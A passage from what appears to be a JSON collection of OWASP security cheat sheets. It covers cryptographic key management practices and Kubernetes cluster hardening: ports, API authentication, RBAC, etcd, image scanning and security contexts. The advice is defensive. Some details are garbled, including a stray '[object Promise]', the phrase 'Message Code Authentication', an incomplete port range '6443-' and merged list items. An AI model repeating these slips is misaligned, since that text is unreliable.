required for each use and purpose. Retention requirements of the data may differ for different data types.\r\n\r\n### Cryptographic Module Topics\r\n\r\nAccording to `NIST SP 800-133`, cryptographic modules are the set of hardware, software, and/or firmware that implements security functions (including cryptographic algorithms and key generation) and is contained within a cryptographic module boundary to provide protection of the keys.\r\n\r\n## Key Management Lifecycle Best Practices\r\n\r\n### Generation\r\n\r\nCryptographic keys shall be generated within cryptographic module with at least a `FIPS 140-2` compliance. For explanatory purposes, consider the cryptographic module in which a key is generated to be the key-generating module.\r\n\r\nAny random value required by the key-generating module shall be generated within that module; that is, the Random Bit Generator that generates the random value shall be implemented within cryptographic module with at least a `FIPS 140-2` compliance that generates the key.\r\n\r\nHardware cryptographic modules are preferred over software cryptographic modules for protection.\r\n\r\n### Distribution\r\n\r\nThe generated keys shall be transported (when necessary) using secure channels and shall be used by their associated cryptographic algorithm within at least a `FIPS 140-2` compliant cryptographic modules. For additional detail for the recommendations in this section refer to `NIST Special Paper 800-133`.\r\n\r\n### Storage\r\n\r\n1. Developers must understand where cryptographic keys are stored within the application. Understand what memory devices the keys are stored on.\r\n2. Keys must be protected on both volatile and persistent memory, ideally processed within secure cryptographic modules.\r\n3. Keys should never be stored in plaintext format.\r\n4. Ensure all keys are stored in a cryptographic vault, such as a [hardware security module](https://en.wikipedia.org/wiki/Hardware_security_module) (HSM) or isolated cryptographic service.\r\n5. If you are planning on storing keys in offline devices/databases, then encrypt the keys using Key Encryption Keys (KEKs) prior to the export of the key material. KEK length (and algorithm) should be equivalent to or greater in strength than the keys being protected.\r\n6. Ensure that keys have integrity protections applied while in storage (consider dual purpose algorithms that support encryption and Message Code Authentication (MAC)).\r\n7. Ensure that standard application level code never reads or uses cryptographic keys in any way and use key management libraries.\r\n8. Ensure that keys and cryptographic operation is done inside the sealed vault.\r\n9. All work should be done in the vault (such as key access, encryption, decryption, signing, etc).\r\n\r\nFor a more complete guide to storing sensitive information such as keys, see the [Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md).\r\n\r\n### Escrow and Backup\r\n\r\nData that has been encrypted with lost cryptographic keys will never be recovered. Therefore, it is essential that the application incorporate a secure key backup capability, especially for applications that support data at rest encryption for long-term data stores.\r\n\r\nWhen backing up keys, ensure that the database that is used to store the keys is encrypted using at least a `FIPS 140-2` validated module. It is sometimes useful to escrow key material for use in investigations and for re-provisioning of key material to users in the event that the key is lost or corrupted.\r\n\r\nNever escrow keys used for performing digital signatures, but consider the need to escrow keys that support encryption. Oftentimes, escrow can be performed by the [Certificate Authority](https://en.wikipedia.org/wiki/Certificate_authority) (CA) or key management system that provisions certificates and keys, however in some instances separate APIs must be implemented to allow the system to perform the escrow for the application.\r\n\r\n### Accountability and Audit\r\n\r\nAccountability involves the identification of those that have access to, or control of, cryptographic keys throughout their lifecycles. Accountability can be an effective tool to help prevent key compromises and to reduce the impact of compromises once they are detected.\r\n\r\nAlthough it is preferred that no humans are able to view keys, as a minimum, the key management system should account for all individuals who are able to view plaintext cryptographic keys.\r\n\r\nIn addition, more sophisticated key-management systems may account for all individuals authorized to access or control any cryptographic keys, whether in plaintext or ciphertext form.\r\n\r\nAccountability provides three significant advantages:\r\n\r\n1. It aids in the determination of when the compromise could have occurred and what individuals could have been involved.\r\n2. It tends to protect against compromise, because individuals with access to the key know that their access to the key is known.\r\n3. It is very useful in recovering from a detected key compromise to know where the key was used and what data or other keys were protected by the compromised key.\r\n\r\nCertain principles have been found to be useful in enforcing the accountability of cryptographic keys. These principles might not apply to all systems or all types of keys.\r\n\r\nSome of the principles that apply to long-term keys controlled by humans include:\r\n\r\n1. Uniquely identifying keys.\r\n2. Identifying the key user.\r\n3. Identifying the dates and times of key use, along with the data that is protected.\r\n4. Identifying other keys that are protected by a symmetric or private key.\r\n\r\nTwo types of audit should be performed on key management systems:\r\n\r\n1. The security plan and the procedures that are developed to support the plan should be periodically audited to ensure that they continue to support the Key Management Policy (`NIST SP 800-57 Part 2`).\r\n2. The protective mechanisms employed should be periodically reassessed with respect to the level of security that they provide and are expected to provide in the future, and that the mechanisms correctly and effectively support the appropriate policies.\r\n\r\nNew technology developments and attacks should be taken into consideration. On a more frequent basis, the actions of the humans that use, operate and maintain the system should be reviewed to verify that the humans continue to follow established security procedures.\r\n\r\nStrong cryptographic systems can be compromised by lax and inappropriate human actions. Highly unusual events should be noted and reviewed as possible indicators of attempted attacks on the system.\r\n\r\n### Key Compromise and Recovery\r\n\r\nThe compromise of a key has the following implications:\r\n\r\n1. In general, the unauthorized disclosure of a key used to provide confidentiality protection (i.e., via encryption) means that all information encrypted by that key could be exposed or known by unauthorized entities. The disclosure of a Certificate of Authorities's private signature key means that an adversary can create fraudulent certificates and Certificate Revocation Lists (CRLs).\r\n2. A compromise of the integrity of a key means that the key is incorrect - either that the key has been modified (either deliberately or accidentally), or that another key has been substituted; this includes a deletion (non-availability) of the key. The substitution or modification of a key used to provide integrity calls into question the integrity of all information protected by the key. This information could have been provided by, or changed by, an unauthorized entity that knows the key. The substitution of a public or secret key that will be used (at a later time) to encrypt data could allow an unauthorized entity (who knows the decryption key) to decrypt data that was encrypted using the encryption key.\r\n3. A compromise of a key's usage or application association means that the key could be used for the wrong purpose (e.g., for key establishment instead of digital signatures) or for the wrong application, and could result in the compromise of information protected by the key.\r\n4. A compromise of a key's association with the owner or other entity means that the identity of the other entity cannot be assured (i.e., one does not know who the other entity really is) or that information cannot be processed correctly (e.g., decrypted with the correct key).\r\n5. A compromise of a key's association with other information means that there is no association at all, or the association is with the wrong \"information\". This could cause the cryptographic services to fail, information to be lost, or the security of the information to be compromised. Certain protective measures may be taken in order to minimize the likelihood or consequences of a key compromise. Similar affect as ransomware, except that you can't pay the ransom and get the key back.\r\n\r\nThe following procedures are usually involved:\r\n\r\n1. Limiting the amount of time a symmetric or private key is in plaintext form.\r\n2. Preventing humans from viewing plaintext symmetric and private keys.\r\n3. Restricting plaintext symmetric and private keys to physically protected containers. This includes key generators, key-transport devices, key loaders, cryptographic modules, and key-storage devices.\r\n4. Using integrity checks to ensure that the integrity of a key or its association with other data has not been compromised. For example, keys may be wrapped (i.e., encrypted) in such a manner that unauthorized modifications to the wrapping or to the associations will be detected.\r\n5. Employing key confirmation (see NIST SP 800-57 Part 1 Section 4.2.5.5) to help ensure that the proper key was, in fact, established.\r\n6. Establishing an accountability system that keeps track of each access to symmetric and private keys in plaintext form.\r\n7. Providing a cryptographic integrity check on the key (e.g., using a MAC or a digital signature).\r\n8. The use of trusted timestamps for signed data. i. Destroying keys as soon as they are no longer needed.\r\n9. Creating a compromise-recovery plan, especially in the case of a CA compromise.\r\n\r\nA compromise-recovery plan is essential for restoring cryptographic security services in the event of a key compromise. A compromise-recovery plan shall be documented and easily accessible.\r\n\r\nThe compromise-recovery plan should contain:\r\n\r\n1. The identification and contact info of the personnel to notify.\r\n2. The identification and contact info of the personnel to perform the recovery actions.\r\n3. The re-key method.\r\n4. An inventory of all cryptographic keys and their use (e.g., the location of all certificates in a system).\r\n5. The education of all appropriate personnel on the recovery procedures.\r\n6. An identification and contact info of all personnel needed to support the recovery procedures.\r\n7. Policies that key-revocation checking be enforced (to minimize the effect of a compromise).\r\n8. The monitoring of the re-keying operations (to ensure that all required operations are performed for all affected keys).\r\n9. Any other recovery procedures, which may include:\r\n    1. Physical inspection of the equipment.\r\n    2. Identification of all information that may be compromised as a result of the incident.\r\n    3. Identification of all signatures that may be invalid, due to the compromise of a signing key.\r\n    4. Distribution of new keying material, if required.\r\n\r\n## Trust Stores\r\n\r\n1. Design controls to secure the trust store against injection of third-party root certificates. The access controls are managed and enforced on an entity and application basis.\r\n2. Implement integrity controls on objects stored in the trust store.\r\n3. Do not allow for export of keys held within the trust store without authentication and authorization.\r\n4. Setup strict policies and procedures for exporting key material from applications to network applications and other components.\r\n5. Implement a secure process for updating the trust store.\r\n\r\n## Cryptographic Key Management Libraries\r\n\r\nUse only reputable crypto libraries that are well maintained and updated, as well as tested and validated by third-party organizations (e.g., `NIST`/`FIPS`).\r\n\r\n## Documentation\r\n\r\n- [The definitive guide to encryption key management fundamentals](https://downloads.townsendsecurity.com/ebooks/EKM-Definitive-Guide.pdf).\r\n- [Practical cryptography for developers](https://cryptobook.nakov.com/).\r\n"
    },
    {
      "Kubernetes_Security_Cheat_Sheet.md": "# Kubernetes Security Cheat Sheet\r\n\r\n## Kubernetes\r\n\r\nKubernetes is an open source container orchestration engine for automating deployment, scaling, and management of containerized applications. The open source project is hosted by the Cloud Native Computing Foundation (CNCF).\r\n\r\nWhen you deploy Kubernetes, you get a cluster. A Kubernetes cluster consists of a set of worker machines, called nodes that run containerized applications. The control plane manages the worker nodes and the Pods in the cluster.\r\n\r\n### Control Plane Components\r\n\r\nThe control plane's components make global decisions about the cluster, as well as detecting and responding to cluster events. It consists of components such as kube-apiserver, etcd, kube-scheduler, kube-controller-manager and cloud-controller-manager\r\n\r\n| Component                | Description                                                                                                                                                                                            |\r\n| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\r\n| kube-apiserver           | kube-apiserver exposes the Kubernetes API. The API server is the front end for the Kubernetes control plane.                                                                                                          |\r\n| etcd                     | etcd is a consistent and highly-available key-value store used as Kubernetes' backing store for all cluster data.                                                                                                     |\r\n| kube-scheduler           | kube-scheduler watches for newly created Pods with no assigned node, and selects a node for them to run on.                                                                                                           |\r\n| kube-controller-manager  | kube-controller-manager runs controller processes. Logically, each controller is a separate process, but to reduce complexity, they are all compiled into a single binary and run in a single process.                |\r\n| cloud-controller-manager | The cloud controller manager lets you link your cluster into your cloud provider's API, and separates out the components that interact with that cloud platform from components that just interact with your cluster. |\r\n\r\n### Node Components\r\n\r\nNode components run on every node, maintaining running pods and providing the Kubernetes runtime environment. It consists of components such as kubelet, kube-proxy and container runtime.\r\n\r\n| Component         | Description                                                                                                                |\r\n| ----------------- | -------------------------------------------------------------------------------------------------------------------------- |\r\n| kubelet           | kubelet is an agent that runs on each node in the cluster. It makes sure that containers are running in a Pod.             |\r\n| kube-proxy        | kube-proxy is a network proxy that runs on each node in your cluster, implementing part of the Kubernetes Service concept. |\r\n| Container runtime | The container runtime is the software that is responsible for running containers.                                          |\r\n\r\n[object Promise]\r\n\r\nThis cheat sheet provides a starting point for securing Kubernetes cluster. It is divided into the following categories:\r\n\r\n- Securing Kubernetes hosts\r\n- Securing Kubernetes components\r\n- Kubernetes Security Best Practices: Build Phase\r\n- Kubernetes Security Best Practices: Deploy Phase\r\n- Kubernetes Security Best Practices: Runtime Phase\r\n\r\n## Securing Kubernetes hosts\r\n\r\nThere are several options available to deploy Kubernetes: on bare metal, on-premise, and in the public cloud (custom Kubernetes build on virtual machines OR use a managed service). Kubernetes was designed to be highly portable and customers can easily switch between these installations, migrating their workloads.\r\n\r\nAll of this potential customization of Kubernetes means it can be designed to fit a large variety of scenarios; however, this is also its greatest weakness when it comes to security. Kubernetes is designed out of the box to be customizable and users must turn on certain functionality to secure their cluster. This means that the engineers responsible for deploying the Kubernetes platform need to know about all the potential attack vectors and vulnerabilities poor configuration can lead to.\r\n\r\nIt is recommended to harden the underlying hosts by installing the latest version of operating system, hardening the operating system, implement necessary patch management and configuration management system, implementing essential firewall rules and undertake specific security measures depending on the datacenter environment.\r\n\r\n### Kubernetes Version\r\n\r\nIt has become impossible to track all potential attack vectors. This fact is unfortunate as there is nothing more vital than to be aware and on top of potential threats. The best defense is to make sure that you are running the latest available version of Kubernetes.\r\n\r\nThe Kubernetes project maintains release branches for the most recent three minor releases and it backports the applicable fixes, including security fixes, to those three release branches, depending on severity and feasibility. Patch releases are cut from those branches at a regular cadence, plus additional urgent releases, when required. Hence it is always recommended to upgrade the Kubernetes cluster to the latest available stable version. It is recommended to refer to the version skew policy for further details <https://kubernetes.io/docs/setup/release/version-skew-policy/>.\r\n\r\nThere are several techniques such as rolling updates, and node pool migrations that allow you to complete an update with minimal disruption and downtime.\r\n\r\n## Securing Kubernetes components\r\n\r\n### Control network access to sensitive ports\r\n\r\nKubernetes clusters usually listen on a range of well-defined and distinctive ports which makes it easier identify the clusters and attack them.\r\nHence it is highly recommended to configure authentication and authorization on the cluster and cluster nodes.\r\n\r\nHere is an overview of the default ports used in Kubernetes. Make sure that your network blocks access to ports and consider limiting access to the Kubernetes API server except from trusted networks.\r\n\r\n**Master node(s):**\r\n\r\n| Protocol | Port Range | Purpose                 |\r\n| -------- | ---------- | ----------------------- |\r\n| TCP      | 6443-      | Kubernetes API Server   |\r\n| TCP      | 2379-2380 | etcd server client API |\r\n| TCP      | 10250      | Kubelet API             |\r\n| TCP      | 10251      | kube-scheduler          |\r\n| TCP      | 10252      | kube-controller-manager |\r\n| TCP      | 10255      | Read-Only Kubelet API   |\r\n\r\n**Worker nodes:**\r\n\r\n| Protocol | Port Range | Purpose               |\r\n| -------- | ----------- | --------------------- |\r\n| TCP      | 10250       | Kubelet API           |\r\n| TCP      | 10255       | Read-Only Kubelet API |\r\n| TCP      | 30000-32767 | NodePort Services     |\r\n\r\n## Limit Direct Access to Kubernetes Nodes\r\n\r\nYou should limit SSH access to Kubernetes nodes, reducing the risk for unauthorized access to host resource. Instead you should ask users to use \"kubectl exec\", which will provide direct access to the container environment without the ability to access the host.\r\n\r\nYou can use Kubernetes Authorization Plugins to further control user access to resources. This allows defining fine-grained-access control rules for specific namespace, containers and operations.\r\n\r\n### Controlling access to the Kubernetes API\r\n\r\nThe Kubernetes platform is controlled using API requests and as such is the first line of defense against attackers. Controlling who has access and what actions they are allowed to perform is the primary concern. For more information, refer to the documentation at <https://kubernetes.io/docs/reference/access-authn-authz/controlling-access/>.\r\n\r\n### Use Transport Layer Security\r\n\r\nCommunication in the cluster between services should be handled using TLS, encrypting all traffic by default. This, however, is often overlooked with the thought being that the cluster is secure and there is no need to provide encryption in transit within the cluster.\r\n\r\nAdvances in network technology, such as the service mesh, have led to the creation of products like LinkerD and Istio which can enable TLS by default while providing extra telemetry information on transactions between services.\r\n\r\nKubernetes expects that all API communication in the cluster is encrypted by default with TLS, and the majority of installation methods will allow the necessary certificates to be created and distributed to the cluster components. Note that some components and installation methods may enable local ports over HTTP and administrators should familiarize themselves with the settings of each component to identify potentially unsecured traffic.\r\n\r\nTo learn more on usage of TLS in Kubernetes cluster, refer to the documentation at <https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/#1-tls-everywhere>.\r\n\r\n### API Authentication\r\n\r\nKubernetes provides a number of in-built mechanisms for API server authentication, however these are likely only suitable for non-production or small clusters.\r\n\r\n- [Static Token File](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#static-token-file) authentication makes use of clear text tokens stored in a CSV file on API server node(s). Modifying credentials in this file requires an API server re-start to be effective.\r\n- [X509 Client Certs](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#x509-client-certs) are available as well however these are unsuitable for production use, as Kubernetes does [not support certificate revocation](https://github.com/kubernetes/kubernetes/issues/18982) meaning that user credentials cannot be modified or revoked without rotating the root certificate authority key and re-issuing all cluster certificates.\r\n- [Service Accounts Tokens](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens) are also available for authentication. Their primary intended use is to allow workloads running in the cluster to authenticate to the API server, however they can also be used for user authentication.\r\n\r\nThe recommended approach for larger or production clusters, is to use an external authentication method:\r\n\r\n- [OpenID Connect](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#openid-connect-tokens) (OIDC) lets you externalize authentication, use short lived tokens, and leverage centralized groups for authorization.\r\n- Managed Kubernetes distributions such as GKE, EKS and AKS support authentication using credentials from their respective IAM providers.\r\n- [Kubernetes Impersonation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) can be used with both managed cloud clusters and on-prem clusters to externalize authentication without having to have access to the API server configuration parameters.\r\n\r\nIn addition to choosing the appropriate authentication system, API access should be considered privileged and use Multi-Factor Authentication (MFA) for all user access.\r\n\r\nFor more information, consult Kubernetes authentication reference documentation at <https://kubernetes.io/docs/reference/access-authn-authz/authentication>.\r\n\r\n### API Authorization - Implement role-based access control\r\n\r\nIn Kubernetes, you must be authenticated (logged in) before your request can be authorized (granted permission to access). Kubernetes expects attributes that are common to REST API requests. This means that Kubernetes authorization works with existing organization-wide or cloud-provider-wide access control systems which may handle other APIs besides the Kubernetes API.\r\n\r\nKubernetes authorizes API requests using the API server. It evaluates all of the request attributes against all policies and allows or denies the request. All parts of an API request must be allowed by some policy in order to proceed. This means that permissions are denied by default.\r\n\r\nRole-based access control (RBAC) is a method of regulating access to computer or network resources based on the roles of individual users within your organization.\r\n\r\nKubernetes ships an integrated Role-Based Access Control (RBAC) component that matches an incoming user or group to a set of permissions bundled into roles. These permissions combine verbs (get, create, delete) with resources (pods, services, nodes) and can be namespace or cluster scoped. A set of out of the box roles are provided that offer reasonable default separation of responsibility depending on what actions a client might want to perform. It is recommended that you use the Node and RBAC authorizers together, in combination with the NodeRestriction admission plugin.\r\n\r\nRBAC authorization uses the rbac.authorization.k8s.io API group to drive authorization decisions, allowing you to dynamically configure policies through the Kubernetes API.\r\nTo enable RBAC, start the API server with the --authorization-mode flag set to a comma-separated list that includes RBAC; for example:\r\n\r\n```bash\r\nkube-apiserver --authorization-mode=Example,RBAC --other-options --more-options\r\n```\r\n\r\nFor detailed examples of utilizing RBAC, refer to Kubernetes documentation at <https://kubernetes.io/docs/reference/access-authn-authz/rbac>\r\n\r\n### Restrict access to etcd\r\n\r\netcd is a critical Kubernetes component which stores information on state and secrets, and it should be protected differently from the rest of your cluster. Write access to the API server's etcd is equivalent to gaining root on the entire cluster, and even read access can be used to escalate privileges fairly easily.\r\n\r\nThe Kubernetes scheduler will search etcd for pod definitions that do not have a node. It then sends the pods it finds to an available kubelet for scheduling. Validation for submitted pods is performed by the API server before it writes them to etcd, so malicious users writing directly to etcd can bypass many security mechanisms - e.g. PodSecurityPolicies.\r\n\r\nAdministrators should always use strong credentials from the API servers to their etcd server, such as mutual auth via TLS client certificates, and it is often recommended to isolate the etcd servers behind a firewall that only the API servers may access.\r\n\r\n#### Caution\r\n\r\nAllowing other components within the cluster to access the master etcd instance with read or write access to the full keyspace is equivalent to granting cluster-admin access. Using separate etcd instances for non-master components or using etcd ACLs to restrict read and write access to a subset of the keyspace is strongly recommended.\r\n\r\n### Controlling access to the Kubelet\r\n\r\nKubelets expose HTTPS endpoints which grant powerful control over the node and containers. By default Kubelets allow unauthenticated access to this API. Production clusters should enable Kubelet authentication and authorization.\r\n\r\nFor more information, refer to Kubelet authentication/authorization documentation at <https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/>\r\n\r\n### Securing Kubernetes Dashboard\r\n\r\nThe Kubernetes dashboard is a webapp for managing your cluster. It is not a part of the Kubernetes cluster itself, it has to be installed by the owners of the cluster. Thus, there are a lot of tutorials on how to do this. Unfortunately, most of them create a service account with very high privileges. This caused Tesla and some others to be hacked via such a poorly configured K8s dashboard. (Reference: Tesla cloud resources are hacked to run cryptocurrency-mining malware - <https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware/>)\r\n\r\nTo prevent attacks via the dashboard, you should follow some tips:\r\n\r\n- Do not expose the dashboard without additional authentication to the public. There is no need to access such a powerful tool from outside your LAN\r\n- Turn on RBAC, so you can limit the service account the dashboard uses\r\n- Do not grant the service account of the dashboard high privileges\r\n- Grant permissions per user, so each user only can see what they are supposed to see\r\n- If you are using network policies, you can block requests to the dashboard even from internal pods (this will not affect the proxy tunnel via kubectl proxy)\r\n- Before version 1.8, the dashboard had a service account with full privileges, so check that there is no role binding for cluster-admin left.\r\n- Deploy the dashboard with an authenticating reverse proxy, with multi-factor authentication enabled.  This can be done with either embedded OIDC `id_tokens` or using Kubernetes Impersonation.  This allows you to use the dashboard with the user's credentials instead of using a privileged `ServiceAccount`.  This method can be used on both on-prem and managed cloud clusters.\r\n\r\n## Kubernetes Security Best Practices: Build Phase\r\n\r\nSecuring containers and Kubernetes starts in the build phase with securing your container images. The two main things to do here are to build secure images and to scan those images for any known vulnerabilities.\r\n\r\nA Container image is an immutable, lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings [<https://www.docker.com/resources/what-container>]. The image shares the kernel of the operating system present in its host machine.\r\n\r\nContainer images must be built using approved and secure base image that is scanned and monitored at regular intervals to ensure only secure and authentic images can be used within the cluster. It is recommended to configure strong governance policies regarding how images are built and stored in trusted image registries.\r\n\r\n### Ensure That Only Authorized Images are used in Your Environment\r\n\r\nWithout a process that ensures that only images adhering to the organization’s policy are allowed to run, the organization is open to risk of running vulnerable or even malicious containers. Downloading and running images from unknown sources is dangerous. It is equivalent to running software from an unknown vendor on a production server. Don’t do that.\r\n\r\n### Container registry and the use of an image scanner to identify known vulnerabilities\r\n\r\nContainer registry is the central repository of container images. Based on the needs, we can utilize public repositories or have a private repository as the container registry. Use private registries to store your approved images - make sure you only push approved images to these registries. This alone reduces the number of potential images that enter your pipeline to a fraction of the hundreds of thousands of publicly available images.\r\n\r\nBuild a CI pipeline that integrates security assessment (like vulnerability scanning), making it part of the build process. The CI pipeline should ensure that only vetted code (approved for production) is used for building the images. Once an image is built, it should be scanned for security vulnerabilities, and only if no issues are found then the image would be pushed to a private registry, from which deployment to production is done. A failure in the security assessment should create a failure in the pipeline, preventing images with bad security quality from being pushed to the image registry.\r\n\r\nMany source code repositories provide scanning capabilities (e.g. [Github](https://docs.github.com/en/code-security/supply-chain-security), [GitLab](https://docs.gitlab.com/ee/user/application_security/container_scanning/index.html)), and many CI tools offer integration with open source vulnerability scanners such as [Trivy](https://github.com/aquasecurity/trivy) or [Grype](https://github.com/anchore/grype).\r\n\r\nThere is work in progress being done in Kubernetes for image authorization plugins, which will allow preventing the shipping of unauthorized images. For more information, refer to the PR <https://github.com/kubernetes/kubernetes/pull/27129>.\r\n\r\n### Use minimal base images and avoid adding unnecessary components\r\n\r\nAvoid using images with OS package managers or shells because they could contain unknown vulnerabilities. If you must include OS packages, remove the package manager at a later step. Consider using minimal images such as distroless images, as an example.\r\n\r\nRestricting what's in your runtime container to precisely what's necessary for your app is a best practice employed by Google and other tech giants that have used containers in production for many years. It improves the signal to noise of scanners (e.g. CVE) and reduces the burden of establishing provenance to just what you need.\r\n\r\n#### Distroless images\r\n\r\nDistroless images contains less packages compared to other images, and does not includes shell, which reduce the attack surface.\r\n\r\nFor more information on distroless images, refer to <https://github.com/GoogleContainerTools/distroless>.\r\n\r\n#### Scratch image\r\n\r\nAn empty image, ideal for statically compiled languages like Go. Because the image is empty - the attack surface it truly minimal - only your code!\r\n\r\nFor more information, refer to <https://hub.docker.com/_/scratch>\r\n\r\n### Use the latest images/ensure images are up to date\r\n\r\nEnsure your images (and any third-party tools you include) are up to date and utilizing the latest versions of their components.\r\n\r\n## Kubernetes Security Best Practices: Deploy Phase\r\n\r\nKubernetes infrastructure should be configured securely prior to workloads being deployed. From a security perspective, you first need visibility into what you’re deploying – and how. Then you can identify and respond to security policy violations. At a minimum, you need to know:\r\n\r\n- What is being deployed - including information about the image being used, such as components or vulnerabilities, and the pods that will be deployed\r\n- Where it is going to be deployed - which clusters, namespaces, and nodes\r\n- How it is deployed - whether it runs privileged, what other deployments it can communicate with, the pod security context that is applied, if any\r\n- What it can access - including secrets, volumes, and other infrastructure components such as the host or orchestrator API\r\n- Is it compliant - whether it complies with your policies and security requirements\r\n\r\n### Use Kubernetes namespaces to properly isolate your Kubernetes resources\r\n\r\nNamespaces give you the ability to create logical partitions and enforce separation of your resources as well as limit the scope of user permissions.\r\n\r\n#### Setting the namespace for a request\r\n\r\nTo set the namespace for a current request, use the --namespace flag. Refer to the following examples:\r\n\r\n```bash\r\nkubectl run nginx --image=nginx --namespace=<insert-namespace-name-here>\r\nkubectl get pods --namespace=<insert-namespace-name-here>\r\n```\r\n\r\n#### Setting the namespace preference\r\n\r\nYou can permanently save the namespace for all subsequent kubectl commands in that context.\r\n\r\n```bash\r\nkubectl config set-context --current --namespace=<insert-namespace-name-here>\r\n```\r\n\r\nValidate it with the following command.\r\n\r\n```bash\r\nkubectl config view --minify | grep namespace:\r\n```\r\n\r\nLearn more about namespaces at <https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces>\r\n\r\n### Create policies to govern image provenance using the ImagePolicyWebhook\r\n\r\nPrevent unapproved images from being used with the admission controller ImagePolicyWebhook to reject pods that use unapproved images including:\r\n\r\n- Images that haven’t been scanned recently\r\n- Images that use a base image that’s not explicitly allowed\r\n- Images from insecure registries\r\nLearn more about webhook at <https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook>\r\n\r\n### Implement Continuous Security Vulnerability Scanning\r\n\r\nNew vulnerabilities are published every day and containers might include outdated packages with recently-disclosed vulnerabilities (CVEs). A strong security posture will include regular production scanning, covering first-party containers (applications you have built and previously scanned) and third-party containers (sourced from trusted repository and vendors).\r\n\r\nOpen Source projects such as [ThreatMapper](https://github.com/deepfence/ThreatMapper) can assist in identifying and prioritizing vulnerabilities.\r\n\r\n### Regularly Apply Security Updates to Your Environment\r\n\r\nIn case vulnerabilities are found in running containers, it is recommended to always update the source image and redeploy the containers.\r\n\r\n#### NOTE\r\n\r\nTry to avoid direct updates to the running containers as this can break the image-container relationship.\r\n\r\n```\r\nExample: apt-update  \r\n```\r\n\r\nUpgrading containers is extremely easy with the Kubernetes rolling updates feature - this allows gradually updating a running application by upgrading its images to the latest version.\r\n\r\n### Assess the privileges used by containers\r\n\r\nThe set of capabilities, role bindings, and privileges given to containers can greatly impact your security risk. The goal here is to adhere to the principle of least privilege and provide the minimum privileges and capabilities that would allow the container to perform its intended function.\r\n\r\nPod Security Policies are one way to control the security-related attributes of pods, including container privilege levels. These can allow an operator to specify the following:\r\n\r\n- Do not run application processes as root.\r\n- Do not allow privilege escalation.\r\n- Use a read-only root filesystem.\r\n- Use the default (masked) /proc filesystem mount\r\n- Do not use the host network or process space - using \"hostNetwork:true\" will cause NetworkPolicies to be ignored since the Pod will use its host network.\r\n- Drop unused and unnecessary Linux capabilities.\r\n- Use SELinux options for more fine-grained process controls.\r\n- Give each application its own Kubernetes Service Account.\r\n- Do not mount the service account credentials in a container if it does not need to access the Kubernetes API.\r\n\r\nFor more information on Pod security policies, refer to the documentation at <https://kubernetes.io/docs/concepts/policy/pod-security-policy/>.\r\n\r\n### Apply Security Context to Your Pods and Containers\r\n\r\nA security context is a property defined in the deployment yaml. It controls the security parameters that will be assigned to the pod/container/volume. These controls can eliminate entire classes of attacks that depend on privileged access. Read-only root file systems, for example, can prevent any attack that depends on installing software or writing to the file system.\r\n\r\nWhen designing your containers and pods, make sure that you configure the security context for your pods, containers and volumes to grant only the privileges needed for the resource to function. Some of the important parameters are as follows:\r\n\r\n| Security Context Setting                | Description                                                                  |\r\n| --------------------------------------- | ---------------------------------------------------------------------------- |\r\n| SecurityContext->runAsNonRoot           | Indicates that containers should run as non-root user                        |\r\n| SecurityContext->Capabilities           | Controls the Linux capabilities assigned to the container.                   |\r\n| SecurityContext->readOnlyRootFilesystem | Controls whether a container will be able to write into the root filesystem. |\r\n| PodSecurityContext->runAsNonRoot        | Prevents running a container with 'root' user as part of the pod             |\r\n\r\nHere is an example for pod definition with security context parameters:\r\n\r\n```yaml\r\napiVersion: v1  \r\nkind: Pod  \r\nmetadata:  \r\n  name: hello-world  \r\nspec:  \r\n  containers:  \r\n  # specification of the pod’s containers  \r\n  # ...\r\n  # ...\r\n  # Security Context\r\n  securityContext:  \r\n    readOnlyRootFilesystem: true  \r\n    runAsNonRoot: true\r\n```\r\n\r\nFor more information on security context for Pods, refer to the documentation at <https://kubernetes.io/docs/tasks/configure-pod-container/security-context>\r\n\r\n### Implement Service Mesh\r\n\r\nA service mesh is an infrastructure layer for microservices applications that can help reduce the complexity of managing microservices and deployments by handling infrastructure service communication quickly, securely and reliably. Service meshes are great at solving operational challenges and issues when running containers and microservices because they provide a uniform way to secure, connect and monitor microservices. Service mesh provides the following advantages:\r\n\r\n#### Observability\r\n\r\nService Mesh provides tracing and telemetry metrics that make it easy to understand your system and quickly root cause any problems.\r\n\r\n#### Security\r\n\r\nA service mesh provides security features aimed at securing the services inside your network and quickly identifying any compromising traffic entering your cluster. A service mesh can help you more easily manage security through mTLS, ingress and egress control, and more.\r\n\r\n- mTLS and Why it Matters\r\n\r\nSecuring microservices is hard. There are a multitude of tools that address microservices security, but service mesh is the most elegant solution for addressing encryption of on-the-wire traffic within the network.\r\n\r\nService mesh provides defense with mutual TLS (mTLS) encryption of the traffic between your services. The mesh can automatically encrypt and decrypt requests and responses, removing that burden from the application developer. It can also improve performance by prioritizing the reuse of existing, persistent connections, reducing the need for the computationally expensive creation of new ones. With service mesh, you can secure traffic over the wire and also make strong identity-based authentication and authorizations for each microservice.\r\n\r\nWe see a lot of value in this for enterprise companies. With a good service mesh, you can see whether mTLS is enabled and working between each of your services and get immediate alerts if security status changes.\r\n\r\n- Ingress & Egress Control\r\n\r\nService mesh adds a layer of security that allows you to monitor and address compromising traffic as it enters the mesh. Istio integrates with Kubernetes as an ingress controller and takes care of load balancing for ingress. This allows you to add a level of security at the perimeter with ingress rules. Egress control allows you to see and manage external services and control how your services interact with them.\r\n\r\n#### Operational Control\r\n\r\nA service mesh allows security and platform teams to set the right macro controls to enforce access controls, while allowing developers to make customizations they need to move quickly within these guardrails.\r\n\r\n#### RBAC\r\n\r\nA strong Role Based Access Control (RBAC) system is arguably one of the most critical requirements in large engineering organizations, since even the most secure system can be easily circumvented by overprivileged users or employees. Restricting privileged users to least privileges necessary to perform job responsibilities, ensuring access to systems are set to “deny all” by default, and ensuring proper documentation detailing roles and responsibilities are in place is one of the most critical security concerns in the enterprise.\r\n\r\n#### 